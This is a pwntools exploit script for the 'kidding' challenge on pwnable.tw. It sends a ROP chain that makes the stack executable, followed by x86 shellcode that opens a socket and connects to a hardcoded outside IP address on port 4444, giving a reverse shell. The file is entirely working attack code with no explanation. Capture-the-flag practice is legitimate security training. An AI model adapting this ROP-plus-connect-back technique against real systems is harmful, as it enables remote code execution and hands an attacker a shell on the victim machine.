from pwn import *

#io = process('./kidding')
io = remote('chall.pwnable.tw', 10303)
elf = ELF('./kidding')

pop_eax = 0x080b8536
pop_ebx = 0x080481c9
pop_ecx = 0x080583c9
pop_edx = 0x0806ec8b
pop_ebp = 0x080483ca
pop_edi = 0x08048480
pop_esi = 0x08048433
int80 = 0x0806f28f
shellzone = 0x80e9500
jmp_eax = 0x08050184
mov_derefed_edx_eax = 0x0805462b
push_esp = 0x080b8546

def pwn():
    pl = b'a'*0xc
    pl += p32(pop_edx)
    pl += p32(elf.sym['__stack_prot'])
    pl += p32(pop_eax)
    pl += p32(0x7)
    pl += p32(mov_derefed_edx_eax)
    pl += p32(pop_eax)
    pl += p32(elf.sym['__libc_stack_end'])
    pl += p32(elf.sym['_dl_make_stack_executable'])
    pl += p32(push_esp)
    pl += asm('''
 push   0x0
 push   0x1
 push   0x2
 mov    al,0x66
 xor    ebx,ebx
 inc    ebx
 mov    ecx,esp
 int    0x80
 mov    edx,eax
 push   0xbc865722
 push   0x5c110002
 mov    ecx,esp
 push   0x10
 push   ecx
 push   edx
 inc    ebx
 inc    ebx
 mov    ecx,esp
 mov    al, 0x66
 int    0x80
 xchg   ebx, eax
 dec    edx
 mov    ecx, esp
 int    0x80
    ''')
    #gdb.attach(io)
    io.send(pl)
pwn()
io.interactive()

